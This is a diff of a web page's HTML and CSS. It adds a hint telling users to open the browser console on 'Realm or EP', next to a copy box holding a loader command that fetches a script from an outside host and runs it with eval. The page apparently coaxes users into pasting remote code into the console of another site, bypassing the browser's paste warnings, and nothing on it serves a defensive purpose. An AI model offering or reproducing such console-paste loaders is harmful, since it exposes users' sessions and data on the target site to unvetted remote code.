@@ -768,6 +768,15 @@
     background: transparent;
     color: var(--accent);
   }
+  .code-meta-hint {
+    margin-top: 14px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-size: 12.5px;
+    color: #64748b;
+  }
 
   /* ─── ALLOW PASTING TROUBLESHOOTING BOX ─── */
   .allow-pasting-box {
@@ -1276,6 +1285,10 @@
       <div class="code-box">
         <input class="code-input" id="loader-code-input" type="text" readonly value="javascript:fetch('https://hub-zero.site/loader.js').then(r=>r.text()).then(eval)">
         <button class="code-copy-btn" id="btn-copy-loader">Copy</button>
+      </div>
+
+      <div class="code-meta-hint">
+        <span>Tip: To open console on Realm or EP run <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>J</kbd></span>
       </div>
     </div>
 
